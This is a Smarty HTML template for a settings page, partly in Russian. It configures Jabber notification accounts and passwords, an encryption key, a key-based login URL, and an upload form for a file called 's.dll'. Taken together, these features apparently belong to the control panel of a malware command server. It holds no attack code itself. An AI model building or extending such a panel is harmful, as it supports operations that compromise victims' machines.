<form action="" enctype="application/x-www-form-urlencoded" method="post">
<h2 align="center">{$lang.settings}</h2>
<hr />
{if $jabber_start ne 1}
<input type="button" name="jabber_start" value="{$lang.startjabber}" style="width:200px" onclick="this.type='submit'; this.click();" />
{else}
<input type="button" name="jabber_stop" value="{$lang.stopjabber}" style="width:200px" onclick="this.type='submit'; this.click();" />
{/if}
<hr />
{if $account_errors ne ""}
<div align="center">
{$account_errors}
</div>
<br />
{/if}

<table border="0" cellspacing="0" cellpadding="10" class="reg" style="width:100%">

<tr>
  <td style="width:250px;">{$lang.lang}:</td>
  <td>
  <select name="lang" class="reg_input" style="width: 99%">
  <option value="ru"{if $smarty.post.lang eq 'ru"'} selected="selected"{/if}>Russian</option>
  <option value="en"{if $smarty.post.lang eq 'en'} selected="selected"{/if}>English</option>
  </select> 
  </td>
</tr>

</table>

<hr />

<table border="0" cellspacing="0" cellpadding="10" class="reg" style="width:100%">
<tr>
  <td style="width:250px;">{$lang.dkapk}:</td>
  <td colspan="2">
    <select name="autorize_key" class="reg_input">
      <option value="0"{if $smarty.post.autorize_key ne '1'} selected="selected"{/if}>{$lang.false}</option>
      <option value="1"{if $smarty.post.autorize_key eq '1'} selected="selected"{/if}>{$lang.true}</option>
      </select>
      <br />
    </td>
</tr>
<tr>
  <td style="width:250px;">{$lang.lia}:</td>
  <td colspan="2"><input name="akey" type="hidden" value="{$conf.akey}" />
  <input type="text" value="http://{$smarty.server.HTTP_HOST}/login/?x={$conf.akey}" class="reg_input" readonly="readonly" /></td>
</tr>
</table>

<hr />

<table border="0" cellspacing="0" cellpadding="10" class="reg" style="width:100%">
<tr>
  <td style="width:250px;">Ключ шифрования:</td>
  <td colspan="2"><input name="keysh" type="text" value="{$conf.keysh}" class="reg_input" /></td>
</tr>
</table>

<hr />

<table border="0" cellspacing="0" cellpadding="10" class="reg" style="width:100%">

<tr>
  <td style="width:250px;">Jabber Admin UID:</td>
  <td><input name="jabber[admin]" type="text" value="{$smarty.post.jabber.admin}" class="reg_input" /></td>
</tr>
<tr>
  <td >Jabber {$lang.login} #1:</td>
  <td><input name="jabber[1][uid]" type="text" value="{$smarty.post.jabber.1.uid}" class="reg_input" /></td>
</tr>
<tr>
  <td >Jabber {$lang.pass} #1:</td>
  <td><input name="jabber[1][pass]" type="text" value="{$smarty.post.jabber.1.pass}" class="reg_input" /></td>
</tr>
<tr>
  <td >Jabber {$lang.login} #2:</td>
  <td><input name="jabber[2][uid]" type="text" value="{$smarty.post.jabber.2.uid}" class="reg_input" /></td>
</tr>
<tr>
  <td >Jabber {$lang.pass} #2:</td>
  <td><input name="jabber[2][pass]" type="text" value="{$smarty.post.jabber.2.pass}" class="reg_input" /></td>
</tr>

<tr>
  <td >Jabber {$lang.ko} ({$lang.login}):</td>
  <td><input name="jabber[tracking]" type="text" value="{$smarty.post.jabber.tracking}" class="reg_input" /></td>
</tr>

</table>

<hr />

<input type="submit" name="save" value="{$lang.save}" style="width:100%;" />
</form>
<hr />
<h2 align="center">Загрузка s.dll</h2>
<hr />

<form action="" enctype="multipart/form-data" method="post">
<table border="0" cellspacing="0" cellpadding="10" class="reg" style="width:100%">
<tr>
  <td style="width:250px;">Файл:</td>
  <td colspan="2"><input name="new_dll" type="file"/></td>
</tr>
<tr>
  <td colspan="3" style="width:250px;"><input type="submit" name="load_ddl" value="Загрузить" style="width:100%;" /></td>
  </tr>
</table>
</form>
<hr />


<hr />